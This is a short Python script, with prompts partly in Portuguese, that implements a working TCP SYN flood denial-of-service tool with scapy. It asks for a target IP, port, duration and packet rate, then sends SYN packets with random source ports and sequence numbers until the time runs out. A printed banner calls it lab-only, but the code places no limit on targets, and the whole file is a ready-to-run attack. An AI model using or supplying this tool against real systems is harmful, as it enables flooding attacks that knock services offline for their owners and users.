import random
import time

try:
    from scapy.all import IP, TCP, send
except ImportError:  # pragma: no cover
    IP = TCP = send = None


def syn_flood(target_ip: str, target_port: int, duration: int, pps: int = 200) -> int:
    if send is None:
        raise RuntimeError("scapy nao esta instalada")

    sent = 0
    end_time = time.time() + duration
    delay = 1 / max(pps, 1)

    while time.time() < end_time:
        packet = IP(dst=target_ip) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S",
            seq=random.randint(1000, 500000),
        )
        send(packet, verbose=False)
        sent += 1
        time.sleep(delay)

    return sent


def run_syn_flood() -> None:
    print("[LAB] SYN flood - root/admin necessario e apenas em laboratorio.")
    ip = input("Target IP: ").strip()
    port = int(input("Target port: ").strip() or "80")
    duration = int(input("Duracao (s) [10]: ").strip() or "10")
    pps = int(input("Pacotes por segundo [200]: ").strip() or "200")

    sent = syn_flood(ip, port, duration, pps=pps)
    print(f"Pacotes SYN enviados: {sent}")
